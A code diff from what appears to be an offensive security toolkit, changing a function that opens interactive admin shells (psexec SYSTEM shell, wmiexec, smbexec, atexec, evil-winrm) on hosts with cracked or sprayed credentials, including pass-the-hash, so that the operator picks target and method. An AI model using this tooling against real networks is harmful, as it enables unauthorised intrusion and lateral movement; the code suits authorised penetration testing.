@@ -9738,32 +9738,51 @@ def _smb_foothold_cmd(method: str, binexe: str, host: str, dom: str, user: str,
 
 
 def _tool_smb_foothold(ip: str, port: int, proto: str) -> str:
-    """SMB step 13 tool (INTERACTIVE): auto-spawn an interactive admin session on the first
-    host smb-spray/smb-exec confirmed local admin — psexec preferred (full SYSTEM shell),
-    falling back to wmiexec / smbexec / atexec, or evil-winrm when WinRM is open. Pass-the-hash
-    when the cred is an NT hash. Opens the session in a new terminal window; headless, it prints
-    the exact command. Authorised targets only."""
+    """SMB step 13 tool (INTERACTIVE): spawn an interactive admin session on a host smb-spray/
+    smb-exec confirmed local admin. The operator picks the target and the exec method — psexec
+    (full SYSTEM shell), wmiexec / smbexec / atexec, or evil-winrm when WinRM is open (psexec is
+    the default). Pass-the-hash when the cred is an NT hash. Opens the session in a new terminal
+    window; headless, it prints the exact command. Authorised targets only."""
     admins = _gather_smb_admin()
     if not admins:
         print(f"\n{YELLOW}no confirmed admin creds{RESET} — run {BOLD}smb-spray (r9){RESET} / "
               f"{BOLD}smb-exec (r10){RESET} first, then retry.")
         return "smb-foothold: no admin creds (run smb-spray r9 / smb-exec r10)"
-    host, user, secret = admins[0]                # auto: first confirmed admin target
+
+    if len(admins) == 1:                          # one target → no need to ask
+        host, user, secret = admins[0]
+    else:
+        print(f"\n{BOLD}admin targets{RESET}")
+        for i, (h, u, _s) in enumerate(admins, 1):
+            print(f"  {BOLD}{i}{RESET}  {u} @ {h}")
+        v = _ask("pick target [1-N, blank = cancel]:")
+        if not v or not v.isdigit() or not 1 <= int(v) <= len(admins):
+            print(f"{DIM}cancelled{RESET}")
+            return "smb-foothold: cancelled"
+        host, user, secret = admins[int(v) - 1]
+
     methods = _smb_foothold_methods(host)
     if not methods:
         print(f"\n{RED}✗ no exec tooling{RESET} — install impacket (psexec/wmiexec) or evil-winrm.")
         return "smb-foothold: no exec tooling available"
+    if len(methods) == 1:
+        method, binexe = methods[0]
+    else:
+        print(f"\n{BOLD}exec method{RESET} {DIM}(1 = psexec = full SYSTEM shell){RESET}")
+        for i, (nm, _b) in enumerate(methods, 1):
+            print(f"  {BOLD}{i}{RESET}  {nm}")
+        v = _ask("pick method [1-N, blank = 1]:")
+        method, binexe = methods[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(methods)) \
+            else methods[0]
+
     is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
     dom = _smb_cred_domain(user, secret)
-    method, binexe = methods[0]                    # auto: best (psexec-first)
     cmd = _smb_foothold_cmd(method, binexe, host, dom, user, secret, is_hash)
     cmd_str = shlex.join(cmd)
     who = f"{dom}\\{user}" if dom else user
 
-    print(f"\n{GREEN}✓ admin target:{RESET} {who}@{host}  "
+    print(f"\n{GREEN}✓ target:{RESET} {who}@{host}  "
           f"{DIM}· method {BOLD}{method}{RESET}{DIM}{' · pass-the-hash' if is_hash else ''}{RESET}")
-    if len(methods) > 1:
-        print(f"  {DIM}fallbacks: {', '.join(n for n, _b in methods[1:])}{RESET}")
     term = _open_shell_terminal(cmd_str)
     if term:
         print(f"{GREEN}▶ spawned {method} in a new {term} window{RESET} {DIM}→ {who}@{host}{RESET}")
